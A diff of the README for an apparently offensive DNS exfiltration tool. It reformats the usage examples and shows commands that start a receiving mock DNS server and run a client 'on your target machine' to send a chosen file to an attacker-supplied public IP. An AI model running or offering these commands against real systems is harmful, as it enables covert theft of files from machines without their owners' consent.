@@ -14,16 +14,12 @@ The script can be run in two modes: host or client. The host mode should be used
 ### Host
 Running the script in host mode will run a mock DNS server on udp/53 (by default, you can change the port if you want to) which is built specifically to receive exfiltrated data from the script in client mode. For example:
 
-```
-python3 dns-exfil.py -mode host -hostip "127.0.0.1" -password "my_secret_password_used_for_intransit_data_encryption"
-```
+`python3 dns-exfil.py -mode host -hostip "127.0.0.1" -password "my_secret_password_used_for_intransit_data_encryption"`
 
 ### Client
 On your target machine, copy-paste / install the script and run it. For example:
 
-```
-python3 dns-exfil.py -mode client -dest "your_public_machine_ip" -password "the_same_secret_password_as_set_on_the_host_script" -file "/path/to/the/file/you/want/to/exfil"
-```
+`python3 dns-exfil.py -mode client -dest "your_public_machine_ip" -password "the_same_secret_password_as_set_on_the_host_script" -file "/path/to/the/file/you/want/to/exfil"`
 
 ### More help
 `python3 dns-exfil.py -h`
